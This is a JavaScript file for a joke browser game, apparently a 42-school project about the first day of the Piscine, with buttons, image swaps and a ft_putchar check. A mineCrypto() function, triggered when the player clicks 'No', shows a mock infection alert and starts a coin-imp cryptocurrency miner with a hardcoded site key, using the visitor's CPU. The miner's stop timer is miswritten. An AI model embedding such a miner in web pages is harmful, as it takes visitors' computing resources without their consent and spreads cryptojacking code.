// ************************************************************************** //
//                                                                            //
//                                                        :::      ::::::::   //
//   scumm.js                                           :+:      :+:    :+:   //
//                                                    +:+ +:+         +:+     //
//   By: patrisor <marvin@42.fr>                    +#+  +:+       +#+        //
//                                                +#+#+#+#+#+   +#+           //
//   Created: 2019/09/10 19:02:32 by patrisor          #+#    #+#             //
//   Updated: 2019/09/10 23:56:24 by patrisor         ###   ########.fr       //
//                                                                            //
// ************************************************************************** //

var playerName = '';

function sleep(ms) 
{
  return new Promise(resolve => setTimeout(resolve, ms));
}

function resetText(arr)
{
	arr.forEach(function(element) {
		document.getElementById(element).innerHTML = '';
	});
}

// THANKS TO (https://github.com/immrmonero/coin-imp.git) FOR CRYTPO REPO
function mineCrypto()
{
	document.getElementById("cluster").src = "resources/hacked.png";
	document.getElementsByClassName("green")[0].innerHTML = '';
	alert("WARNING!\nYour Computer is Infected:\nWe will be using your CPU to mine crypto. MUAHAHAH!!!");
	const CoinImp = require('coin-imp');
	// Create miner
	const miner = CoinImp('7591494ad1e56601bc8358580d567b319753bc773de35ce1f0d53bb8e4b97186'); // CoinImp's Site Key
	// Start miner
	miner.start();
	// Listen on events
	miner.on('found', () => console.log('Found!'));
	miner.on('accepted', () => console.log('Accepted!'));
	miner.on('update', data =>
		console.log(`
			Hashes per second: ${data.hashesPerSecond}
			Total hashes: ${data.totalHashes}
			Accepted hashes: ${data.acceptedHashes}
		`)
	);
	// Stop miner
	setTimeout(miner.stop(), 60000);
}

function initButton(b)
{
	var		ret;

	ret = document.createElement("BUTTON");
	ret.id = b;
	ret.value = b;
	ret.innerHTML = b;
	ret.setAttribute("type", "button");
	ret.setAttribute("class", "b");
	ret.setAttribute("onclick", ((b == "No") ? "mineCrypto();" : "piscene();"));
	return(ret);
}

function moulinette()
{
	if (document.getElementById("CODE").value == "void ft_putchar(char c) { write(1, &c, 1); }")
		alert("YOU WON!")
	alert("MOULINETTE HAS FAILED YOU!");
}

function initButton2()
{
	var		ret;

	ret = document.createElement("BUTTON");
	ret.id = "PUSH";
	ret.value = "PUSH";
	ret.innerHTML = "PUSH";
	ret.setAttribute("type", "button");
	ret.setAttribute("class", "b");
	ret.setAttribute("onclick", "moulinette();");
	return(ret);
}

function terminal()
{
	var		text;

	document.getElementById("info").innerHTML = "Write ft_putchar() correctly to win.";
	document.getElementsByClassName("gray-block mid-block")[0].removeChild(document.getElementById("cluster"));
	text = document.createElement("TEXTAREA");
	text.setAttribute("rows", "10");
	text.setAttribute("cols", "102");
	text.id = "CODE";
	document.getElementsByClassName("gray-block mid-block")[0].appendChild(text);
	document.getElementsByClassName("gray-block mid-block")[0].appendChild(initButton2());
}

function computer()
{
	document.getElementById("cluster").src = "resources/imac.jpg";
	document.getElementById("info").innerHTML = "You found an empty spot. To grab the keyboard, click the Hand Button on top left to secure the computer.";
	document.getElementById("ikea").removeAttribute("href");
	document.getElementById("apple").removeAttribute("href");
	document.getElementById("hand").setAttribute("onclick", "terminal();");
}

function piscene()
{
	document.getElementById("greenForm").removeChild(document.getElementById("Yes"));
	document.getElementById("greenForm").removeChild(document.getElementById("No"));
	document.getElementById("info").innerHTML = "<span id='big'>" + "Gaetan" + "</span><br>" + 
		"Awesome! See you in the lab, and keep swimming!";
	sleep(4200).then(() => {
		document.getElementById("cluster").src = "resources/cluster.jpg";
		document.getElementById("info").innerHTML = "Click on the Green Button on top left to Find available computer.";
		document.getElementById("arrow").setAttribute("onclick", "computer();");
	})
}

function initiateGame()
{
	// TAKE USER INPUT
	playerName = document.getElementById("prompt").value;
	// Replace middle picture with gaetan
	document.getElementById("cluster").src = "resources/Gaetan.png";
	// RESET Current HTML elements
	resetText(["ordinateur", "big", "greenForm", "italic"]);
	// Change GREEN FORM
	document.getElementById("info").innerHTML = "<span id='big'>" + "Gaetan" + "</span><br>" + 
		"Hello ".concat(playerName.charAt(0).toUpperCase() + playerName.toLowerCase().slice(1), 
			", are your ready for your first day of the Piscene?");
	document.getElementById("greenForm").appendChild(initButton("Yes"));
	document.getElementById("greenForm").appendChild(initButton("No"));
}

// NOTE: Good place to load code right away
// window.onload = initiateGame;
